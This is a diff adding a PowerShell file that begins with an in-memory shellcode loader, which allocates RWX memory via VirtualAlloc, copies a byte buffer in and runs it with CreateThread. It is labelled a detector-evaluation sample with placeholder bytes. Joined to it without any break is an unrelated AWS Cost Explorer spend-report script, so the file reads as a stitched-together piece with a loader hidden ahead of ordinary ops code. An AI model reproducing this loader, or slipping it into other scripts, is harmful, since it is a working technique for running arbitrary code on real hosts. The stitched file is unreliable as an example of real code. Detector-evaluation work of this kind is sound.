@@ -1,0 +1,136 @@
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class MemoryApi
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0x25, 0xa5, 0x55, 0x25, 0x53, 0x45, 0x00, 0xf9, 0x16, 0x8a, 0x17, 0x83, 0xa0, 0x45, 0xd6, 0xd3,
+        0x1a, 0x6f, 0x11, 0x44, 0x15, 0x77, 0x90, 0x84, 0xe4, 0x49, 0x99, 0xbe, 0x2b, 0x11, 0x5c, 0x89,
+        0xfc, 0x3c, 0xc0, 0x7f, 0xe9, 0xda, 0xa6, 0xf6, 0xbc, 0xd1, 0xd8, 0x04, 0x52, 0xfe, 0xc1, 0x38,
+        0xc7, 0x2b, 0x62, 0xb8, 0xa4, 0x0e, 0xd2, 0x59, 0xae, 0xd6, 0x61, 0x97, 0x23, 0x20, 0x7c, 0x7b,
+        0xc8, 0xca, 0xaa, 0x24, 0xd3, 0x11, 0xc2, 0x6c, 0x16, 0xe7, 0xfa, 0x95, 0xee, 0xd0, 0xab, 0x69,
+        0xe6, 0x01, 0xdb, 0x25, 0xfc, 0x1f, 0xf5, 0x32, 0x91, 0x4e, 0x25, 0xec, 0x8d, 0x4f, 0x58, 0x7d,
+        0xea, 0xcd, 0xcb, 0xcb, 0x05, 0x10, 0xd7, 0x4b, 0xf0, 0xb7, 0x47, 0x4c, 0xee, 0x38, 0x7b, 0xbc,
+        0x5d, 0x34, 0x2c, 0xa2, 0x44, 0x6d, 0x01, 0xcc, 0x61, 0x09, 0x40, 0x49, 0xfc, 0x36, 0x0d, 0x98,
+        0xb3, 0x54, 0xed, 0xa4, 0xd8, 0xe0, 0x56, 0x70, 0xd2, 0xb3, 0x95, 0xcb, 0x15, 0x25, 0x1c, 0x0d,
+        0xc6, 0x45, 0x04, 0xff, 0x95, 0x29, 0x03, 0x99, 0x18, 0x1f, 0x1e, 0x57, 0x8e, 0xe7, 0xd3, 0x8a,
+        0x62, 0x4a, 0xaf, 0x4b, 0xbd, 0xc9, 0xb0, 0xd6, 0xf2, 0xfc, 0x9b, 0xf4, 0x67, 0x25, 0x07, 0xc9,
+        0x4e, 0x66, 0xea, 0xcd, 0x09, 0xca, 0xe3, 0xbe, 0x8f, 0xe4, 0x92, 0x7d, 0xce, 0xd5, 0x27, 0xcf,
+        0x86, 0xec, 0x5b, 0x3d, 0x6d, 0xa7, 0x7d, 0x11, 0xe6, 0x83, 0xeb, 0xf7, 0xbe, 0x17, 0x46, 0xd1,
+        0x99, 0x11, 0xb6, 0xa3, 0x89, 0x9e, 0x7c, 0xce, 0x1f, 0x29, 0x02, 0x98, 0x10, 0x53, 0x47, 0x1c,
+        0x73, 0xbd, 0x48, 0xca, 0x41, 0x18, 0x59, 0xc6, 0xb6, 0xd3, 0x8d, 0xd0, 0xe4, 0x64, 0xe4, 0x2b,
+        0xa0, 0x88, 0x8c, 0x8e, 0xab, 0xc8, 0x86, 0x53, 0x30, 0x92, 0x3e, 0x3c
+    )
+
+    $ProcHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($ProcHandle -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][MemoryApi]::WaitForSingleObject($Thread, 2299)
+    [void][MemoryApi]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
+$Threshold   = 500
+$Region      = "eu-west-1"
+$ProfileName = "default"
+$Month       = '2025-01'
+$Account     = '929863334300'
+$ReportPath  = 'D:\Ops\finops\cost-aws-2025-01.csv'
+$OutputPath  = "D:\Ops\finops\cost-aws-2025-01.json"
+
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+
+$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
+$end = (Get-Date).ToString('yyyy-MM-01')
+$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
+if ($LASTEXITCODE -ne 0) {
+    throw 'AWS Cost Explorer query failed.'
+}
+$cost = $raw | ConvertFrom-Json
+$groups = foreach ($bucket in $cost.ResultsByTime) {
+    foreach ($group in $bucket.Groups) {
+        [pscustomobject]@{
+            Period  = $bucket.TimePeriod.Start
+            Service = $group.Keys[0]
+            Amount  = [math]::Round([double]$group.Metrics.UnblendedCost.Amount, 2)
+            Unit    = $group.Metrics.UnblendedCost.Unit
+        }
+    }
+}
+$byService = $groups | Group-Object -Property Service | ForEach-Object {
+    [pscustomobject]@{
+        Service = $_.Name
+        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
+    }
+} | Sort-Object -Property Amount -Descending
+$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
+Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan
+
+$byService | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
+$topServices = $byService | Select-Object -First 5
+$topServices | Format-Table -AutoSize
+if ($total -gt $Threshold) {
+    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
